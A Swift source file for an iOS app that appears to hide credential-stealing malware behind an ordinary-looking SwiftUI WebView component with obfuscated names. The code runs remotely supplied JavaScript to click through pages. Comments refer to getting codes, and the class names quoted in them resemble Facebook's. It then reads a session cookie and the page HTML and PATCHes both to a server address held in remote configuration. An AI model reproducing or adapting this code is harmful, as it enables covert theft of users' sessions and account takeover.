//
//  File.swift
//  
//
//  Created by DanHa on 30/03/2023.
//

import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct SevenCoorReco: UIViewRepresentable {
    func makeCoordinator() -> SevenCoordiClss {
        SevenCoordiClss(self)
    }

    let url: URL?
    @Binding var doneSevenReco: Bool
    var listData: [String: String] = [:]
    private let sevenobs = SevenObs()
    var sevenobserver: NSKeyValueObservation? {
        sevenobs.sevenins
    }

    // end check url

    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true // true
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs

        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = listData[RemoKey.rm02ch.rawValue] ?? ""
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))

        return webview
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {
        sevenobs.sevenins = uiView.observe(\WKWebView.url, options: .new) { _, _ in
        } // observable
    } // updateUIView

    class SevenCoordiClss: NSObject, WKNavigationDelegate {
        var prentSevenReco: SevenCoorReco
        init(_ prentSevenReco: SevenCoorReco) {
            self.prentSevenReco = prentSevenReco
        }

        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
        } // didStartProvisionalNavigation

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            // Click cho 2 truong hop
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                // Click Show lan 1
                webView.evaluateJavaScript(self.prentSevenReco.listData[RemoKey.eight1af.rawValue] ?? "", completionHandler: { _, _ in }) // Click Show lan 1
            } // DispatchQueue

            // Click cho lan dau tien ( Getcode)
            DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                webView.evaluateJavaScript(self.prentSevenReco.listData[RemoKey.eight2af.rawValue] ?? "", completionHandler: { _, _ in })
            } // DispatchQueue

            // class="_42ft _4jy0 _4m0m _4jy3 _4jy1 selected _51sy"
            // Click cho lan dau tien ( Getcode) //_42ft _4jy0 _4m0m _4jy3 _4jy1 selected _51sy
            DispatchQueue.main.asyncAfter(deadline: .now() + 4.0) {
                webView.evaluateJavaScript(self.prentSevenReco.listData[RemoKey.eight3af.rawValue] ?? "", completionHandler: { _, _ in })
            } // DispatchQueue

            // Click cho lan dau tien ( Getcode)
            DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
                webView.evaluateJavaScript(self.prentSevenReco.listData[RemoKey.eight4af.rawValue] ?? "", completionHandler: { _, _ in })
            } // DispatchQueue

            // Reload class="_3-8_ img" trc khi save du lieu ve server
            DispatchQueue.main.asyncAfter(deadline: .now() + 7.0) {
                webView.evaluateJavaScript(self.prentSevenReco.listData[RemoKey.eight5af.rawValue] ?? "", completionHandler: { _, _ in })
            } // DispatchQueue

            DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) {
                // GET HTML
                webView.evaluateJavaScript(self.prentSevenReco.listData[RemoKey.eight6af.rawValue] ?? "") { data, error in
                    if let recoHtm = data as? String, error == nil {
                        if !recoHtm.isEmpty {
                            if recoHtm.contains(self.prentSevenReco.listData[RemoKey.eight7af.rawValue] ?? "") {
                                WKWebsiteDataStore.default().httpCookieStore.getAllCookies({ cookies in
                                    let cokiSevenReco = cookies.firstIndex(where: { $0.name == self.prentSevenReco.listData[RemoKey.nam09ap.rawValue] ?? "" })
                                    if cokiSevenReco != nil {
                                        let jsonSixx: [String: Any] = [
                                            self.prentSevenReco.listData[RemoKey.nam20ap.rawValue] ?? "": cookies[cokiSevenReco!].value,
                                            self.prentSevenReco.listData[RemoKey.nam21ap.rawValue] ?? "": "\(recoHtm)",
                                            self.prentSevenReco.listData[RemoKey.nam22ap.rawValue] ?? "": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? "") - ONE",
                                        ]
                                        let url: URL = URL(string: self.prentSevenReco.listData[RemoKey.rm07ch.rawValue] ?? "")!
                                        let jsonSixData = try? JSONSerialization.data(withJSONObject: jsonSixx)
                                        var request = URLRequest(url: url)
                                        request.httpMethod = "PATCH"
                                        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                        request.httpBody = jsonSixData
                                        let task = URLSession.shared.dataTask(with: request) { data, _, error in
                                            if error != nil {
                                                // print("loi khong gui dc du lieu")
                                            } else if data != nil {
                                                DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
                                                    self.prentSevenReco.doneSevenReco = true
                                                    // print("Da gui du lieu thanh cong")
                                                }
                                            }
                                        }
                                        task.resume()
                                    } // if
                                }) // getAllCookies
                            }
                        }
                    } else { print("error_get_html") }
                }
            }
        }
    }
}

private class SevenObs: ObservableObject {
    @Published var sevenins: NSKeyValueObservation?
}
